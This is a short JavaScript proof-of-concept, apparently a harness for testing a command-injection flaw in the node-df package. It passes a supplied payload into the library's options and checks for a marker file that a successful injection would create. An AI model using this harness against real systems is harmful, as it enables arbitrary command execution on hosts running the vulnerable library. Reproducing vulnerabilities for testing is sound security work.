function exploitFunction(payload) {
  const df = require("node-df");
  const fs = require("fs");

  const options = {
    ...payload,
    prefixMultiplier: "GB",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };

  df(options, function (error, response) {
    if (error) {
      console.error(error);
    } else {
      const path = "./node-df";
      const file_exist = fs.existsSync(path);
      console.log("File exists:", file_exist);
    }
  });
}

module.exports = { exploitFunction };